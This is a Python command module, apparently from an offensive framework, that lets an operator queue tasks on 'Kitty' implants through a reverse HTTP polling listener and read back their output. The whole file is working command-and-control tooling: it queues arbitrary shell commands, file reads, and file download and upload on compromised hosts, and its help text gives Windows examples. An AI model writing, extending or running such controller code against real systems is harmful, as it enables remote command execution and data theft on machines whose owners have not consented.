#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Queue typed tasks on Kitty polling agents."""

from __future__ import annotations

import base64
from pathlib import Path
from typing import List, Optional

from interfaces.command_system.base_command import BaseCommand
from core.output_handler import print_error, print_info, print_success, print_warning
from lib.c2.task_protocol import (
    make_download_task,
    make_ls_task,
    make_shell_task,
    make_upload_task,
    AgentTask,
)


class AgentTaskCommand(BaseCommand):
    @property
    def name(self) -> str:
        return "agent_task"

    @property
    def aliases(self) -> List[str]:
        return ["atask", "ktask"]

    @property
    def description(self) -> str:
        return "Queue typed tasks on Kitty polling agents"

    @property
    def usage(self) -> str:
        return (
            "agent_task <session> shell|ls|pwd|whoami|cat|download|upload|exit [args...] "
            "| agent_task output <session>"
        )

    @property
    def help_text(self) -> str:
        return """
Queue typed tasks for python_kitty_agent implants
(compatible with reverse_http_polling).

Examples:
    agent_task <sid> shell whoami
    agent_task <sid> ls C:\\Users
    agent_task <sid> pwd
    agent_task <sid> whoami
    agent_task <sid> download C:\\Windows\\Temp\\out.txt
    agent_task <sid> upload C:\\local\\file.txt C:\\Windows\\Temp\\file.txt
    agent_task output <sid>
        """

    def get_subcommands(self) -> List[str]:
        return ["shell", "ls", "pwd", "whoami", "cat", "download", "upload", "exit", "output", "help"]

    def execute(self, args: List[str], **kwargs) -> bool:
        if not args or args[0] in ("-h", "--help", "help"):
            self.show_help()
            return True
        if args[0].lower() == "output":
            return self._output(args[1:])
        if len(args) < 2:
            print_error("Usage: agent_task <session_id> <command> [args...]")
            return False
        sid = args[0]
        cmd = args[1].lower()
        rest = args[2:]
        listener = self._listener_for(sid)
        if not listener:
            return False
        real_sid = self._resolve_sid(sid)
        task = self._build_task(cmd, rest)
        if not task:
            return False
        if not hasattr(listener, "set_pending_task"):
            print_error("Listener does not support typed tasks")
            return False
        tid = listener.set_pending_task(real_sid, task)
        print_success(f"Queued {task.command} task_id={tid or task.task_id} on {real_sid}")
        return True

    def _build_task(self, cmd: str, rest: List[str]) -> Optional[AgentTask]:
        if cmd == "shell":
            return make_shell_task(" ".join(rest))
        if cmd == "ls":
            return make_ls_task(rest[0] if rest else ".")
        if cmd == "pwd":
            return AgentTask(command="pwd")
        if cmd == "whoami":
            return AgentTask(command="whoami")
        if cmd == "cat":
            if not rest:
                print_error("cat requires a path")
                return None
            return AgentTask(command="cat", args={"path": rest[0]})
        if cmd == "download":
            if not rest:
                print_error("download requires a remote path")
                return None
            return make_download_task(rest[0])
        if cmd == "upload":
            if len(rest) < 2:
                print_error("upload <local_path> <remote_path>")
                return None
            local, remote = rest[0], rest[1]
            data = Path(local).read_bytes()
            return make_upload_task(remote, base64.b64encode(data).decode())
        if cmd == "exit":
            return AgentTask(command="exit")
        print_error(f"Unknown task command: {cmd}")
        return None

    def _output(self, args: List[str]) -> bool:
        if not args:
            print_error("Usage: agent_task output <session_id>")
            return False
        listener = self._listener_for(args[0])
        if not listener:
            return False
        sid = self._resolve_sid(args[0])
        out = listener.get_output(sid, clear=False) if hasattr(listener, "get_output") else ""
        if out:
            print_info(out)
        else:
            print_warning("No output yet")
        return True

    def _resolve_sid(self, session_id: str) -> str:
        sm = getattr(self.framework, "session_manager", None)
        if not sm:
            return session_id
        sess = sm.get_session(session_id)
        if sess:
            return getattr(sess, "id", None) or getattr(sess, "session_id", None) or session_id
        for s in sm.get_sessions() or []:
            sid = getattr(s, "id", None) or getattr(s, "session_id", None)
            if sid and str(sid).startswith(session_id):
                return str(sid)
        return session_id

    def _listener_for(self, session_id: str):
        sm = getattr(self.framework, "session_manager", None)
        if not sm:
            print_error("Session manager unavailable")
            return None
        sess = sm.get_session(session_id)
        if not sess:
            for s in sm.get_sessions() or []:
                sid = getattr(s, "id", None) or getattr(s, "session_id", None)
                if sid and str(sid).startswith(session_id):
                    sess = s
                    break
        if not sess:
            print_error(f"Session not found: {session_id}")
            return None
        data = getattr(sess, "data", None) or {}
        listener_id = data.get("listener_id") if isinstance(data, dict) else None
        active = getattr(self.framework, "active_listeners", None) or {}
        if listener_id and listener_id in active:
            return active[listener_id]
        sid = getattr(sess, "id", None) or getattr(sess, "session_id", None)
        for listener in active.values():
            if hasattr(listener, "set_pending_task") and sid in getattr(
                listener, "_session_to_client_id", {}
            ):
                return listener
        print_error("No reverse_http_polling listener for this session")
        return None
